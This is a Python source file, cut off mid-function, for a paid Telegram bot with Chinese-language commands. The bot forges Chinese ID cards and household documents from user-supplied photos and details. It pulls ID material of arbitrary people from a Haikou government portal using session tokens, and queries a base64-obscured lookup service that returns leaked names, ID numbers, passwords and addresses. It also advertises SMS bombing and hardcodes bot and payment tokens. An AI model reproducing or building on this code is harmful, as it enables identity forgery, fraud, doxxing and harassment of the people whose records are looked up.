#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
print("===== Bot 精简稳定版（新增 /sms 刷短信，计费每条约0.99积分）=====")

import os, subprocess

# ===== 自动安装依赖（如果 requirements.txt 存在） =====
REQ_FILE = "requirements.txt"
if os.path.exists(REQ_FILE):
    print("📦 正在自动安装 requirements.txt 中的依赖...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", REQ_FILE])
        print("✅ 依赖安装完成")
    except Exception as e:
        print(f"⚠️ 自动安装失败: {e}")
else:
    print("ℹ️ 未找到 requirements.txt，跳过自动安装")

# ===== 导入所有第三方库 =====
import time, json, io, tempfile, requests, urllib3, logging, re, random, threading, hashlib, hmac, urllib.parse, base64, itertools
from datetime import datetime
from pathlib import Path
from PIL import Image, ImageDraw, ImageFont
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, ConversationHandler, MessageHandler, Filters, CallbackQueryHandler
from flask import Flask, request, jsonify

# ---------- 新增：GMSSL 支持（三要素核验用到） ----------
try:
    from gmssl.sm2 import CryptSM2
    GMSSL_AVAILABLE = True
except ImportError:
    GMSSL_AVAILABLE = False
    print("⚠️ 未安装 gmssl，/3ys 命令将无法使用，请先 pip install gmssl")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('MergedBot')

# ===== 配置 =====
BOT_TOKEN = os.environ.get('BOT_TOKEN') or "5849383582:AAHCJvXTUGUFv9iFjkSaRMkQpLh838fdN1M"
BASE_COOKIES = {
    "cna": os.environ.get('CNA') or "REPLACE_CNA_HERE",
    "JSESSIONID": os.environ.get('JSESSIONID') or "REPLACE_JSESSIONID_HERE",
    "SESSION": os.environ.get('SESSION') or "REPLACE_SESSION_HERE",
    "SERVERID": os.environ.get('SERVERID') or "REPLACE_SERVERID_HERE",
}
ZWFW_TOKEN = os.environ.get('ZWFW_TOKEN') or "REPLACE_ZWFW_TOKEN_HERE"
FIXED_NAME = "刘德华"
SAVE_FOLDER = "temp_files"
RETRY_TIMES = 5
OKPAY_ID = int(os.environ.get('OKPAY_ID') or 36326)
OKPAY_TOKEN = os.environ.get('OKPAY_TOKEN') or 'TCtvS9O6idNOw3XaDyoTEEVG8awJCkdb'
OKPAY_API_URL = 'https://api.okaypay.me/shop/'
CALLBACK_URL = os.environ.get('CALLBACK_URL') or 'https://docs.okaypay.me/'
PORT = 8080
POINTS_RATE = 1
CHECK_INTERVAL = 0.5
ORDER_TIMEOUT = 1800
ADMIN_IDS = [6040143940]

# 收费常量（已修改）
HN_COST = 1.0          # 海南查询（改为1积分）
GX_COST = 999.0        # 广西查询
KHZC_COST = 1.0        # 空号检测
YS_COST = 1.0          # 二要素
THREE_COST = 1.0       # 新增三要素核验

# ---------- 三要素核验所需常量 ----------
PUBLIC_KEY = "04be7a5cfde4e83a21efb711dec86f5e6b253a9e3927540bf854439229e2e7eb1cd0dc3de522c90eb7ab639d93094fac219ffcde544c39ec2bd908436fa35f0088"

# ===== JSON存储 =====
USERS_FILE = "users.json"
USERS_BACKUP = "users.json.bak"

def load_users():
    global users
    users = {}
    # 尝试读取主文件
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f:
                users = json.load(f)
            if isinstance(users, dict):
                print(f"✅ 成功加载 {len(users)} 个用户")
                save_users()  # 自动备份
                return
        except Exception as e:
            print(f"⚠️ 读取 users.json 失败: {e}")
            # 主文件损坏，尝试从备份恢复
            if os.path.exists(USERS_BACKUP):
                try:
                    with open(USERS_BACKUP, "r") as f:
                        users = json.load(f)
                    if isinstance(users, dict):
                        print(f"✅ 从备份恢复 {len(users)} 个用户")
                        with open(USERS_FILE, "w") as f:
                            json.dump(users, f, indent=2)
                        return
                except Exception as e2:
                    print(f"⚠️ 备份文件也损坏: {e2}")
            # 如果备份也失败，将损坏的主文件重命名，然后新建空文件
            if os.path.exists(USERS_FILE):
                os.rename(USERS_FILE, USERS_FILE + ".corrupt")
                print("⚠️ 已备份损坏文件为 users.json.corrupt")
            users = {}
            save_users()
            print("⚠️ 已创建新的空用户文件（因为原文件损坏）")
    else:
        # 主文件不存在，尝试从备份恢复
        if os.path.exists(USERS_BACKUP):
            try:
                with open(USERS_BACKUP, "r") as f:
                    users = json.load(f)
                if isinstance(users, dict):
                    print(f"✅ 从备份恢复 {len(users)} 个用户")
                    with open(USERS_FILE, "w") as f:
                        json.dump(users, f, indent=2)
                    return
            except:
                pass
        # 没有任何有效数据，创建新文件
        users = {}
        save_users()
        print("⚠️ 未找到用户数据，创建新文件")

def save_users():
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)
    with open(USERS_BACKUP, "w") as f:
        json.dump(users, f, indent=2)

load_users()

def ensure_user(user_id):
    if str(user_id) not in users:
        users[str(user_id)] = {"points":0.0, "total_recharge":0.0, "invites":0, "last_sign_date":"", "created_at":time.strftime('%Y-%m-%d %H:%M:%S')}
        save_users()

def get_user_stats(user_id):
    ensure_user(user_id)
    d = users[str(user_id)]
    return {'points': d.get('points',0.0), 'total_recharge': d.get('total_recharge',0.0), 'last_sign_date': d.get('last_sign_date','')}

def deduct_points(user_id, amount, reason=""):
    ensure_user(user_id)
    if users[str(user_id)].get('points', 0.0) < amount:
        return False, "积分不足"
    users[str(user_id)]['points'] -= amount
    save_users()
    return True, f"已扣除 {amount:.2f} 积分{reason}"

# ===== 字体缓存 =====
_FONT_CACHE = {}
def get_font(font_path, size):
    key = (font_path, size)
    if key not in _FONT_CACHE:
        _FONT_CACHE[key] = ImageFont.truetype(font_path, size)
    return _FONT_CACHE[key]

# ===== 身份证生成（略，不变） =====
HEADERS1 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","zwfw-token":ZWFW_TOKEN,"User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","content-type":"application/json","sec-ch-ua-mobile":"?1","Accept":"*/*","Origin":"https://zwfw.dn.haikou.gov.cn","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
HEADERS2 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","sec-ch-ua-mobile":"?1","Accept":"*/*","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
def query_id_card_sync(id_card):
    id_card=id_card.strip().upper()
    if len(id_card)!=18 or not id_card[:17].isdigit() or id_card[17] not in '0123456789X': return False,"身份证号无效"
    if not os.path.exists(SAVE_FOLDER): os.makedirs(SAVE_FOLDER)
    session=requests.Session(); session.cookies.update(BASE_COOKIES); session.verify=False
    url1="https://zwfw.dn.haikou.gov.cn/rest/materialshare/canShareMaterial"
    data={"itemMaterialId":"1498591712970792960","materialCode":"1173207393439670272","materialName":"委托书原件及委托代理人的身份证明","interfaceParam":"ztmc,zzbh,dzzz_name,cardid,dzzz_type","interfaceParamName":"身份证","canShare":False,"isSignature":"N","appInterfaceId":"136","param":{"ztmc":FIXED_NAME,"zzbh":"","dzzz_name":"随便起个名","cardid":id_card,"dzzz_type":"1"},"itemId":"1047370300041120912","userId":"1547878749006024704"}
    for attempt in range(RETRY_TIMES):
        try: res1=session.post(url1, headers=HEADERS1, json=data, timeout=30); result1=res1.json()
        except Exception as e: print(f"[{attempt+1}/{RETRY_TIMES}] 请求异常: {e}"); time.sleep(2); continue
        print(f"[{attempt+1}/{RETRY_TIMES}] 服务端返回: {json.dumps(result1, ensure_ascii=False, indent=2)}")
        if result1.get("code")=="1":
            try:
                attachment_id=result1["resultDatas"]["result"]["resultDatas"]["attachmentList"][0]["id"]
                res2=session.get(f"https://zwfw.dn.haikou.gov.cn/rest/attachment/{attachment_id}", headers=HEADERS2, timeout=30)
                if res2.status_code==200: return True, res2.content
                else: return False, f"下载失败 HTTP {res2.status_code}"
            except Exception as e: return False, f"解析失败: {e}"
        else: print(f"[{attempt+1}/{RETRY_TIMES}] 查询失败: {result1.get('message')}"); time.sleep(2)
    return False, f"连续 {RETRY_TIMES} 次失败"

def remove_white_background(img, threshold=240):
    if img.mode!='RGBA': img=img.convert('RGBA')
    data=img.getdata(); new_data=[]
    for item in data:
        r,g,b,a=item
        if r>threshold and g>threshold and b>threshold and a!=0: new_data.append((r,g,b,0))
        else: new_data.append(item)
    img.putdata(new_data); return img

def load_issuing_authority_map(file_path):
    m={}
    with open(file_path,'r',encoding='utf-8') as f:
        for line in f:
            line=line.strip()
            if line:
                code,authority=line.split(':'); m[code]=authority
    return m

def get_issuing_authority(id_number, m): return m.get(id_number[:6],"未知签发机关")

def format_address(address, max_chars_per_line=11):
    return [address[i:i+max_chars_per_line] for i in range(0,len(address),max_chars_per_line)]

def generate_id_card_sync(name,id_number,nation,address,expiration_date,user_photo_path):
    if len(id_number)<18: raise ValueError("身份证号码格式不正确")
    birth_date=id_number[6:14]; gender='女' if int(id_number[-2])%2==0 else '男'
    m=load_issuing_authority_map('fonts/签发机关.txt'); issuing_authority=get_issuing_authority(id_number,m)
    template=Image.open('fonts/empty.png').convert("RGBA")
    name_font = get_font('fonts/hei.ttf', 72)
    other_font = get_font('fonts/hei.ttf', 64)
    birth_font = get_font('fonts/fzhei.ttf', 60)
    id_font = get_font('fonts/ocrb10bt.ttf', 90)
    draw=ImageDraw.Draw(template)
    draw.text((630,690),name,font=name_font,fill='black')
    draw.text((630,840),gender,font=other_font,fill='black')
    draw.text((1030,840),nation,font=other_font,fill='black')
    draw.text((630,975),birth_date[:4],font=birth_font,fill='black')
    draw.text((950,975),birth_date[4:6],font=birth_font,fill='black')
    draw.text((1150,975),birth_date[6:],font=birth_font,fill='black')
    y=1115
    for line in format_address(address):
        draw.text((630,y),line,font=other_font,fill='black'); y+=85
    draw.text((900,1475),id_number,font=id_font,fill='black')
    draw.text((1050,2750),issuing_authority,font=other_font,fill='black')
    draw.text((1050,2895),expiration_date,font=other_font,fill='black')
    photo=Image.open(user_photo_path).convert("RGBA"); photo=remove_white_background(photo,240); photo=photo.resize((500,670)); template.paste(photo,(1500,670),mask=photo)
    img_bytes=io.BytesIO(); template.save(img_bytes,format='PNG'); img_bytes.seek(0)
    with tempfile.NamedTemporaryFile(suffix='.png',delete=False) as tmp: tmp_path=tmp.name; template.save(tmp_path,format='PNG')
    pdf_bytes=io.BytesIO(); c=canvas.Canvas(pdf_bytes,pagesize=A4); w,h=template.size; scale=min(A4[0]/w,A4[1]/h); c.drawImage(tmp_path,(A4[0]-w*scale)/2,(A4[1]-h*scale)/2,w*scale,h*scale); c.save(); pdf_bytes.seek(0); os.remove(tmp_path)
    return img_bytes,pdf_bytes

def load_area_map():
    m={}
    file_path='plc/地区.txt'
    if not os.path.exists(file_path): print("警告: 地区文件不存在"); return m
    try:
        with open(file_path,'r',encoding='utf-8') as f:
            for line in f:
                line=line.strip()
                if not line: continue
                parts=line.split(',',1)
                if len(parts)==2:
                    code,name=parts[0].strip(), parts[1].strip(); m[code]=name
        print(f"已加载地区数据，共 {len(m)} 条记录")
    except Exception as e: print("加载地区文件失败: "+str(e))
    return m
AREA_MAP=load_area_map()
def get_address_from_idcard(id_card): return AREA_MAP.get(id_card[:6],None)

def generate_plc_sync(name,id_card,address,avatar_path):
    if len(id_card)!=18: raise ValueError("身份证号必须为18位")
    gender="男" if int(id_card[16])%2==1 else "女"
    if not os.path.exists('plc/mb.jpg'): raise FileNotFoundError("PLC模板文件 mb.jpg 不存在")
    if not os.path.exists('plc/10.ttf'): raise FileNotFoundError("PLC字体文件 10.ttf 不存在")
    template=Image.open('plc/mb.jpg').convert("RGBA")
    avatar=Image.open(avatar_path).convert("RGBA"); avatar=remove_white_background(avatar,240); avatar=avatar.resize((416,500)); template.paste(avatar,(26,333),mask=avatar)
    draw=ImageDraw.Draw(template)
    font = get_font('plc/10.ttf', 55)
    year=id_card[6:10]; month=id_card[10:12]; day=id_card[12:14]; birth_str=f"{year}年{month}月{day}日"
    draw.text((598,314),name,font=font,fill=(0,0,0))
    draw.text((598,398),gender,font=font,fill=(0,0,0))
    draw.text((474,641),id_card,font=font,fill=(0,0,0))
    draw.text((718,482),birth_str,font=font,fill=(0,0,0))
    address_lines=[address[i:i+11] for i in range(0,len(address),11)]
    for i,line in enumerate(address_lines): draw.text((473,782+i*60),line,font=font,fill=(0,0,0))
    img_bytes=io.BytesIO(); template.save(img_bytes,format='PNG'); img_bytes.seek(0)
    pdf_bytes=io.BytesIO(); c=canvas.Canvas(pdf_bytes,pagesize=A4); w,h=template.size; scale=min(A4[0]/w,A4[1]/h)
    with tempfile.NamedTemporaryFile(suffix='.png',delete=False) as tmp: tmp_path=tmp.name; template.save(tmp_path,format='PNG')
    c.drawImage(tmp_path,(A4[0]-w*scale)/2,(A4[1]-h*scale)/2,w*scale,h*scale); c.save(); pdf_bytes.seek(0); os.remove(tmp_path)
    return img_bytes,pdf_bytes

# ===== q反 =====
def decrypt_text(encrypted):
    return base64.b64decode(encrypted).decode()

def query_protected(number):
    url = f"{decrypt_text('aHR0cHM6Ly9zdWN5YW4udG9wL2FwaS9wcml2YWN5LnBocA==')}?{decrypt_text('dmFsdWU=')}={number}"
    try:
        resp = requests.get(url, timeout=20)
        return resp.json()
    except Exception as e:
        return {"code": -1, "msg": str(e)}

def format_qf_result(data):
    FIELDS_MAP = {
        "names": "姓名", "nicknames": "昵称", "phone_numbers": "手机号",
        "id_numbers": "身份证号", "qq_numbers": "QQ号", "wb_numbers": "微博号",
        "passwords": "密码", "emails": "邮箱", "addresses": "地址"
    }
    if data.get("code") != 1:
        return "❌ 查询失败，接口返回错误"
    found = False
    lines = []
    for key, label in FIELDS_MAP.items():
        val = data.get(key)
        if val and str(val).strip():
            lines.append(f"• {label}：{val}")
            found = True
    if not found:
        return "📭 未找到关联信息"
    return "📋 查询结果：\n" + "\n".join(lines)

# ===== OkayPay =====
class OkayPay:
    def __init__(self,appid,token,api_url): self.appid=appid; self.token=token; self.api_url=api_url
    def _build_base(self,params):
        params={k:v for k,v in params.items() if k!='sign' and v is not None and v!=''}
        def flatten(obj,prefix=''):
            items={}
            if isinstance(obj,dict):
                for k,v in obj.items():
                    key=f"{prefix}.{k}" if prefix else k
                    if isinstance(v,dict): items.update(flatten(v,key))
                    else: items[key]=v
            else: items[prefix]=obj
            return items
        flat={}
        for k,v in params.items():
            if isinstance(v,dict): flat.update(flatten(v,k))
            elif isinstance(v,bool): flat[k]='true' if v else 'false'
            else: flat[k]=str(v)
        sorted_params=dict(sorted(flat.items()))
        base='&'.join([f"{k}={v}" for k,v in sorted_params.items()])
        return base
    def _sign(self,params):
        base=self._build_base(params)
        sign=hmac.new(self.token.encode('utf-8'), base.encode('utf-8'), hashlib.sha256).hexdigest().upper()
        return sign
    def _signed_params(self,params):
        nonce=''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',k=16))
        timestamp=int(time.time())
        full_params={'id':str(self.appid),'timestamp':timestamp,'nonce':nonce,**params}
        full_params['sign']=self._sign(full_params)
        return full_params
    def verify(self,data):
        if 'sign' not in data: return False
        in_sign=data['sign']; calc_sign=self._sign(data); return calc_sign==in_sign
    def pay_link(self,amount,unique_id):
        params={'amount':f"{amount:.2f}",'coin':'USDT','unique_id':unique_id,'name':'积分充值','callback_url':CALLBACK_URL,'return_url':CALLBACK_URL}
        signed=self._signed_params(params)
        try:
            resp=requests.post(self.api_url+'payLink', data=signed, headers={'Content-Type':'application/x-www-form-urlencoded'}, timeout=15, verify=False)
            if resp.status_code==200:
                result=resp.json()
                if result.get('status')=='success' and self.verify(result): return result
                else: return {'status':'error','msg':result.get('msg','未知错误')}
            else: return {'status':'error','msg':f'HTTP {resp.status_code}'}
        except Exception as e: return {'status':'error','msg':str(e)}
    def check_deposit(self,unique_id):
        params={'unique_id':unique_id}; signed=self._signed_params(params)
        try:
            resp=requests.post(self.api_url+'checkDeposit', data=signed, headers={'Content-Type':'application/x-www-form-urlencoded'}, timeout=15, verify=False)
            if resp.status_code==200:
                result=resp.json()
                if result.get('status')=='success' and self.verify(result): return result
                else: return {'status':'error','msg':result.get('msg','验证失败')}
            else: return {'status':'error','msg':f'HTTP {resp.status_code}'}
        except Exception as e: return {'status':'error','msg':str(e)}

client=OkayPay(OKPAY_ID, OKPAY_TOKEN, OKPAY_API_URL)
orders={}

def check_orders():
    while True:
        try:
            now=time.time(); expired=[]
            for uid, info in list(orders.items()):
                if now-info['timestamp']>ORDER_TIMEOUT: expired.append(uid); continue
                if info['status']=='pending':
                    result=client.check_deposit(uid)
                    if result and result.get('status')=='success':
                        data=result.get('data',{}); status=data.get('status')
                        if status==1:
                            user_id=info['user_id']; amount=float(data.get('amount',0)); order_id=data.get('order_id')
                            points=amount*POINTS_RATE
                            ensure_user(user_id)
                            users[str(user_id)]['points']=users[str(user_id)].get('points',0.0)+points
                            users[str(user_id)]['total_recharge']=users[str(user_id)].get('total_recharge',0.0)+amount
                            save_users()
                            stats=get_user_stats(user_id)
                            try: bot.send_message(user_id, f"✅ 支付成功！\n订单号: {order_id}\n充值: {amount:.2f} USDT\n获得积分: {points:.2f}\n当前积分: {stats['points']:.2f}")
                            except: pass
                            orders[uid]['status']='completed'
            for uid in expired:
                user_id=orders[uid]['user_id']
                try: bot.send_message(user_id, f"⏰ 订单 {uid} 已过期")
                except: pass
                del orders[uid]
        except Exception as e: logger.error(f"轮询异常: {e}")
        time.sleep(CHECK_INTERVAL)

flask_app=Flask(__name__)
@flask_app.route('/OkPay.php', methods=['POST'])
def callback():
    try:
        data=request.get_json() if request.content_type and 'application/json' in request.content_type else request.form.to_dict()
        if not client.verify(data): return jsonify({'status':'success'}),200
        return jsonify({'status':'success'}),200
    except: return jsonify({'status':'success'}),200

def run_flask(): flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ===== Telegram 命令状态常量 =====
RECHARGE_AMOUNT = 1
QF_QQ = 100
YS_NAME, YS_ID = range(200, 202)
SMS_CHOICE = 300
GX_NAME, GX_ID, GX_PHONE, GX_CAPTCHA, GX_SMS = range(400, 405)
KHZC_PHONE = 500
SFZ_NAME,SFZ_ID,SFZ_NATION,SFZ_ADDR,SFZ_EXPIRY,SFZ_PHOTO=range(6)
PLC_NAME,PLC_ID,PLC_ADDR_CONFIRM,PLC_ADDR_MANUAL,PLC_PHOTO=range(10,15)
# ---------- 新增三要素状态 ----------
THREE_NAME, THREE_PHONE, THREE_ID = range(600, 603)

# ===== 代理池功能（修改为只测前3个） =====
def test_proxy(proxy):
    try:
        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        r = requests.get('https://www.baidu.com', proxies=proxies, timeout=3)
        return r.status_code == 200
    except:
        return False

def load_working_proxy(proxy_file='proxy_list.txt', max_tests=3, timeout_total=10):
    if not os.path.exists(proxy_file):
        logger.warning(f"代理文件 {proxy_file} 不存在，将直连")
        return None
    with open(proxy_file, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    if not proxies:
        logger.warning("代理文件为空，将直连")
        return None
    logger.info(f"从 {len(proxies)} 个代理中测试前 {max_tests} 个（总超时 {timeout_total}s）")
    start_time = time.time()
    for i, p in enumerate(proxies[:max_tests]):
        if time.time() - start_time > timeout_total:
            logger.warning("代理测试总超时，放弃剩余代理")
            break
        try:
            proxies_dict = {'http': f'http://{p}', 'https': f'http://{p}'}
            r = requests.get('https://www.baidu.com', proxies=proxies_dict, timeout=3)
            if r.status_code == 200:
                logger.info(f"✅ 找到可用代理: {p}")
                return p
        except:
            continue
    logger.warning("❌ 没有可用代理，将直连")
    return None

# ===== 基本命令 =====
def start(update, context):
    context.user_data.clear()
    uid=update.effective_user.id; ensure_user(uid); stats=get_user_stats(uid)
    msg = (f"👤 用户：{update.effective_user.first_name or '用户'}\n"
           f"🆔 ID：{uid}\n"
           f"💎 积分：{stats['points']:.2f}\n"
           f"/qd → 每日签到\n"
           f"🌟 每日签到得6积分\n\n"
           f"可用命令：\n"
           f"/sfz → 生成双面身份证（免费）\n"
           f"/plc → 生成PLC个户（免费）\n"
           f"/hn → 海南头（{HN_COST}积分）\n"
           f"/gx → 广西头（{GX_COST}积分）\n"
           f"/khzc → 空号检测（{KHZC_COST}积分）\n"
           f"/2ys → 二要素核实（{YS_COST}积分）\n"
           f"/3ys → 三要素核验（{THREE_COST}积分）\n"  # 新增
           f"/qf → QQ反查历史\n"
           f"/sms → 短信轰炸\n"
           f"/okcz → USDT充值积分\n"
           f"/cx → 查询余额\n"
           f"/zs → 管理员赠送积分\n"
          )
    update.message.reply_text(msg)

def cx(update, context):
    context.user_data.clear()
    stats = get_user_stats(update.effective_user.id)
    update.message.reply_text(f"📊 积分: {stats['points']:.2f}\n累计充值: {stats['total_recharge']:.2f} USDT")

def qd(update, context):
    context.user_data.clear()
    uid = update.effective_user.id
    ensure_user(uid)
    today = time.strftime('%Y-%m-%d')
    if users[str(uid)].get('last_sign_date', '') == today:
        update.message.reply_text("❌ 今天已签到")
        return
    users[str(uid)]['points'] = users[str(uid)].get('points', 0.0) + 6.0
    users[str(uid)]['last_sign_date'] = today
    save_users()
    stats = get_user_stats(uid)
    update.message.reply_text(f"✅ 签到成功！+6 积分，当前 {stats['points']:.2f}")

def zs(update, context):
    context.user_data.clear()
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        update.message.reply_text("❌ 无权限")
        return
    args = context.args
    if len(args) < 2:
        update.message.reply_text("❌ /zs <用户ID> <积分>")
        return
    try:
        target_id = int(args[0])
        amount = float(args[1])
    except:
        update.message.reply_text("❌ 参数错误")
        return
    ensure_user(target_id)
    users[str(target_id)]['points'] = users[str(target_id)].get('points', 0.0) + amount
    save_users()
    stats = get_user_stats(target_id)
    update.message.reply_text(f"✅ 已向 {target_id} 赠送 {amount:.2f} 积分，当前 {stats['points']:.2f}")

def cz(update, context):
    context.user_data.clear()
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        return
    args = context.args
    if not args:
        return
    try:
        target_id = int(args[0])
    except:
        return
    ensure_user(target_id)
    users[str(target_id)]['last_sign_date'] = ''
    save_users()
    update.message.reply_text(f"✅ 已重置 {target_id} 签到")

def qk(update, context):
    context.user_data.clear()
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        return
    for k in users:
        users[k]['last_sign_date'] = ''
    save_users()
    update.message.reply_text("✅ 已清空所有签到日期")

def rh(update, context):
    context.user_data.clear()
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        return
    if not users:
        update.message.reply_text("📭 无用户")
    else:
        msg = "📊 用户列表：\n"
        for k, v in users.items():
            msg += f"ID: `{k}`，积分: {v.get('points', 0):.2f}\n"
        update.message.reply_text(msg, parse_mode='Markdown')

def cancel(update, context):
    context.user_data.clear()
    update.message.reply_text("已取消")
    return ConversationHandler.END

# ===== okcz 充值 =====
def okcz_start(update, context):
    context.user_data.clear()
    uid=update.effective_user.id
    ensure_user(uid)
    stats=get_user_stats(uid)
    update.message.reply_text(f"💰 当前积分 {stats['points']:.2f}\n请输入 USDT 金额：")
    return RECHARGE_AMOUNT

def okcz_amount(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    try:
        amt=float(re.sub(r'[^\d.]','',update.message.text))
    except:
        update.message.reply_text("❌ 请输入数字")
        return RECHARGE_AMOUNT
    if amt<=0:
        update.message.reply_text("金额需大于0")
        return RECHARGE_AMOUNT
    uid=update.effective_user.id
    points=amt*POINTS_RATE
    unique_id=f"ORDER_{int(time.time())}_{uid}_{random.randint(1000,9999)}"
    resp=client.pay_link(amt, unique_id)
    if not resp or resp.get('status')!='success':
        update.message.reply_text(f"❌ 创建订单失败: {resp.get('msg','未知错误')}")
        return ConversationHandler.END
    order_id=resp['data']['order_id']
    pay_url=resp['data']['pay_url']
    orders[unique_id]={'user_id':uid,'amount':amt,'order_id':order_id,'status':'pending','timestamp':time.time()}
    keyboard=[[InlineKeyboardButton("💳 去支付", url=pay_url)]]
    update.message.reply_text(f"✅ 订单已创建\n订单号: {order_id}\n金额: {amt:.2f} USDT → {points:.2f} 积分\n点击按钮支付", reply_markup=InlineKeyboardMarkup(keyboard))
    return ConversationHandler.END

# ===== sfz 生成身份证 =====
def sfz_start(update,context):
    context.user_data.clear()
    update.message.reply_text("请输入姓名：")
    return SFZ_NAME

def sfz_name(update,context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    context.user_data['name']=update.message.text.strip()
    update.message.reply_text("请输入18位身份证号：")
    return SFZ_ID

def sfz_id(update,context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    id_card=update.message.text.strip().upper()
    if len(id_card)!=18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
        update.message.reply_text("格式错误，重新输入：")
        return SFZ_ID
    context.user_data['id_number']=id_card
    update.message.reply_text("请输入民族：")
    return SFZ_NATION

def sfz_nation(update,context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    context.user_data['nation']=update.message.text.strip()
    update.message.reply_text("请输入地址：")
    return SFZ_ADDR

def sfz_address(update,context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    context.user_data['address']=update.message.text.strip()
    update.message.reply_text("请输入有效期（如 2020.01.01-2030.01.01）：")
    return SFZ_EXPIRY

def sfz_expiry(update,context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    context.user_data['expiry']=update.message.text.strip()
    update.message.reply_text("请发送本人照片：")
    return SFZ_PHOTO

def sfz_photo(update,context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    if not update.message.photo:
        update.message.reply_text("请发送图片")
        return SFZ_PHOTO
    photo=update.message.photo[-1]
    file=photo.get_file()
    with tempfile.NamedTemporaryFile(suffix='.jpg',delete=False) as tmp:
        file.download(tmp.name)
        photo_path=tmp.name
    data=context.user_data
    if not all(k in data for k in ['name','id_number','nation','address','expiry']):
        update.message.reply_text("信息不完整，重新 /sfz")
        return ConversationHandler.END
    update.message.reply_text("⏳ 生成中...")
    try:
        img,pdf=generate_id_card_sync(data['name'],data['id_number'],data['nation'],data['address'],data['expiry'],photo_path)
        update.message.reply_photo(photo=img,caption=f"✅ {data['name']} 的身份证")
        context.bot.send_document(chat_id=update.effective_chat.id, document=pdf, filename=f"{data['name']}_身份证.pdf")
    except Exception as e:
        update.message.reply_text(f"❌ 失败: {e}")
    finally:
        if os.path.exists(photo_path):
            os.remove(photo_path)
        context.user_data.clear()
    return ConversationHandler.END

# ===== plc 生成 =====
def plc_start(update,context):
    context.user_data.clear()
    update.message.reply_text("请输入姓名：")
    return PLC_NAME

def plc_name(update,context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    context.user_data['name']=update.message.text.strip()
    update.message.reply_text("请输入18位身份证号：")
    return PLC_ID

def plc_id(update,context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    id_card=update.message.text.strip().upper()
    if len(id_card)!=18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
        update.message.reply_text("格式错误，重新输入：")
        return PLC_ID
    context.user_data['id_number']=id_card
    address=get_address_from_idcard(id_card)
    if address:
        context.user_data['auto_addr']=address
        keyboard=[[InlineKeyboardButton("✅ 使用", callback_data="plc_addr_yes")],[InlineKeyboardButton("❌ 手动", callback_data="plc_addr_no")]]
        update.message.reply_text(f"✅ 匹配到地址：{address}\n是否使用？", reply_markup=InlineKeyboardMarkup(keyboard))
        return PLC_ADDR_CONFIRM
    else:
        update.message.reply_text("请手动输入地址：")
        return PLC_ADDR_MANUAL

def plc_addr_confirm_callback(update,context):
    query=update.callback_query
    query.answer()
    if query.data=="plc_addr_yes":
